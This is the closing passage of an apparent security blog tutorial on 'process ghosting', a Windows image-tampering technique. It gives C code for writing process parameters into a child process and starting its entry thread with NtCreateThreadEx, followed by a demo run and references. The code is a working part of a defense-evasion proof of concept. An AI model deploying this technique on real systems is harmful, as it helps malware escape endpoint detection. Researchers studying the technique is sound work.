+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (LPVOID)proc_params;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>There are two cases that can arise during writing Process Parameters and the Environment Block:</p>
+<ul>
+<li>They are in continuous memory locations, i.e. one after the other</li>
+<li>They are in non-continuous memory locations</li>
+</ul>
+<p>Before that, check out the <code>RTL_USER_PROCESS_PARAMETERS</code> struct:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _RTL_USER_PROCESS_PARAMETERS {
+</span></span><span style="display:flex;"><span>	ULONG MaximumLength;
+</span></span><span style="display:flex;"><span>	ULONG Length;
+</span></span><span style="display:flex;"><span>	ULONG Flags;
+</span></span><span style="display:flex;"><span>	ULONG DebugFlags;
+</span></span><span style="display:flex;"><span>	PVOID ConsoleHandle;
+</span></span><span style="display:flex;"><span>	ULONG ConsoleFlags;
+</span></span><span style="display:flex;"><span>	HANDLE StandardInput;
+</span></span><span style="display:flex;"><span>	HANDLE StandardOutput;
+</span></span><span style="display:flex;"><span>	HANDLE StandardError;
+</span></span><span style="display:flex;"><span>	CURDIR CurrentDirectory;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING DllPath;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING ImagePathName;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING CommandLine;
+</span></span><span style="display:flex;"><span>	PVOID Environment;
+</span></span><span style="display:flex;"><span>	ULONG StartingX;
+</span></span><span style="display:flex;"><span>	ULONG StartingY;
+</span></span><span style="display:flex;"><span>	ULONG CountX;
+</span></span><span style="display:flex;"><span>	ULONG CountY;
+</span></span><span style="display:flex;"><span>	ULONG CountCharsX;
+</span></span><span style="display:flex;"><span>	ULONG CountCharsY;
+</span></span><span style="display:flex;"><span>	ULONG FillAttribute;
+</span></span><span style="display:flex;"><span>	ULONG WindowFlags;
+</span></span><span style="display:flex;"><span>	ULONG ShowWindowFlags;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING WindowTitle;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING DesktopInfo;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING ShellInfo;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING RuntimeData;
+</span></span><span style="display:flex;"><span>	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[<span style="color:#ae81ff">0x20</span>];
+</span></span><span style="display:flex;"><span>	ULONG EnvironmentSize;
+</span></span><span style="display:flex;"><span>} RTL_USER_PROCESS_PARAMETERS, <span style="color:#f92672">*</span> PRTL_USER_PROCESS_PARAMETERS;
+</span></span></code></pre></div><p>Now, back to dealing with the memory locations. For the first case, we calculate the total size of the memory region that we need to allocate, to write both the Process Parameters and the Environment block:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PVOID buffer <span style="color:#f92672">=</span> proc_params;
+</span></span><span style="display:flex;"><span>ULONG_PTR env_end <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>ULONG_PTR buffer_end <span style="color:#f92672">=</span> (ULONG_PTR)proc_params <span style="color:#f92672">+</span> proc_params<span style="color:#f92672">-&gt;</span>Length;
+</span></span><span style="display:flex;"><span>SIZE_T buffer_size;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((ULONG_PTR)proc_params <span style="color:#f92672">&gt;</span> (ULONG_PTR)proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>		buffer <span style="color:#f92672">=</span> (PVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	env_end <span style="color:#f92672">=</span> (ULONG_PTR)proc_params<span style="color:#f92672">-&gt;</span>Environment <span style="color:#f92672">+</span> proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize;	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (env_end <span style="color:#f92672">&gt;</span> buffer_end) {
+</span></span><span style="display:flex;"><span>		buffer_end <span style="color:#f92672">=</span> env_end;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>With that out of the way, we can allocate memory equal to the size of the region and use <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a> function to write to the child process memory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">VirtualAllocEx</span>(hprocess, buffer, buffer_size, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE)) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params<span style="color:#f92672">-&gt;</span>Length, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize, NULL);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (LPVOID)proc_params;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now considering the second option where they are in non-contiguous memory. We individually allocate the memory and write it to the child process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#a6e22e">VirtualAllocEx</span>(hprocess, (LPVOID)proc_params, proc_params<span style="color:#f92672">-&gt;</span>Length, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params<span style="color:#f92672">-&gt;</span>Length, NULL);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">VirtualAllocEx</span>(hprocess, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize, NULL);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (LPVOID)proc_params;
+</span></span></code></pre></div><p>Coming back to assign process arguments and environment variables to the child process, we use the <a href="https://www.pinvoke.net/default.aspx/ntdll/NtReadVirtualMemory.html">NtReadVirtualMemory()</a> function to read and map the child process memory to a <code>PEB</code> structure.</p>
+<p>Now that we have all the ingredients at hand, we can call <code>write_params_to_peb()</code> to write the parameters to the child process. Basically, we calculate where the base address of the PEB lies and the offset at which the <code>ProcessParameters</code> field is located and write the process argument to the child process at the same offset in the child process memory.</p>
+<h3 id="running-the-child-process">Running the child process</h3>
+<p>We are almost there. Our child process is ready. Now, all we need to do is create a thread in the child process. Remember we got the entry point offset? Add that to the Image Base Address obtained from the Process&rsquo;s PEB to get the address of the Entry Point function.</p>
+<p>Finally, we can create a thread with <code>NtCreateThreadEx()</code> and wait infinitely for it&rsquo;s competition with <code>WaitForSingleObject</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ULONGLONG image_base <span style="color:#f92672">=</span> (ULONGLONG)(peb_copy.ImageBaseAddress);
+</span></span><span style="display:flex;"><span>ULONGLONG proc_entry <span style="color:#f92672">=</span> entry_point <span style="color:#f92672">+</span> image_base;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;==== Creating Thread In Child Process ====</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>HANDLE hthread <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">NtCreateThreadEx</span>(<span style="color:#f92672">&amp;</span>hthread, THREAD_ALL_ACCESS, NULL, p_info<span style="color:#f92672">-&gt;</span>p_handle, (LPTHREAD_START_ROUTINE)(proc_entry), NULL, FALSE, NULL, NULL, NULL, NULL);
+</span></span></code></pre></div><p>That should spawn the processes without having an executable disk!</p>
+<h2 id="demo-time">Demo Time!</h2>
+<p>Remember the demo executable we created at the start of this blog? Lets run it with our now-ready process-ghosting program. We run the program as follows:</p>
+<pre tabindex="0"><code>ghosted.exe Z:\demo.exe .\deleteme.exe
+</code></pre><p><img src="/blogs/images/process-ghosting/PoC_Ghosting.png" alt="Process Ghosting"></p>
+<p>Notice how Process Hacker shows no Image File on disk? This indicates that the process was successfully ghosted and our PoC is working!</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack">https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack</a></li>
+<li><a href="https://fourcore.io/blogs/how-a-windows-process-is-created-part-1">https://fourcore.io/blogs/how-a-windows-process-is-created-part-1</a></li>
+<li><a href="https://dosxuz.gitlab.io/post/processghosting/">https://dosxuz.gitlab.io/post/processghosting/</a></li>
+</ul>
+
+  <hr>
+<div class="footer">
+    
+	    
+            
+	            <a class="previous-post" href="https://whokilleddb.github.io/blogs/posts/dotnet-clr-etw/?ref=footer">« A gentle guide to the land of .NET, CLR and ETW</a>
+	        
+        
+	    
+    
+</div>
+
+  <div class="article-toc " >
+    <h4></h4>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#processes-spawned-up-callbacks-get-thrown-up-httpswwwyoutubecomshortsxo5gytho6hi">Processes Spawned Up, Callbacks Get Thrown Up <a href="https://www.youtube.com/shorts/XO5gYTHo6HI">🎵</a></a></li>
+    <li><a href="#processes-vs-exes">Processes vs Exes</a></li>
+    <li><a href="#hot-functions-in-your-area">Hot Functions in your Area</a></li>
+    <li><a href="#boo-a-ghost">Boo! A Ghost! 👻</a></li>
+    <li><a href="#talk-is-cheap-show-me-the-code">Talk is Cheap, Show me the Code!</a>
+      <ul>
+        <li><a href="#initial-setup">Initial Setup</a></li>
+        <li><a href="#prepare-target">Prepare Target</a></li>
+        <li><a href="#reading-bytes">Reading Bytes</a></li>
+        <li><a href="#create-section-object">Create Section Object</a></li>
+        <li><a href="#getting-entry-point">Getting Entry Point</a></li>
+        <li><a href="#spawn-a-child-process">Spawn A Child Process</a></li>
+        <li><a href="#assign-process-arguments-and-environment-variables">Assign process arguments and environment variables</a></li>
+        <li><a href="#running-the-child-process">Running the child process</a></li>
+      </ul>
+    </li>
+    <li><a href="#demo-time">Demo Time!</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+</div>
+
+</div>
+        </main>
+    </body>
+</html>
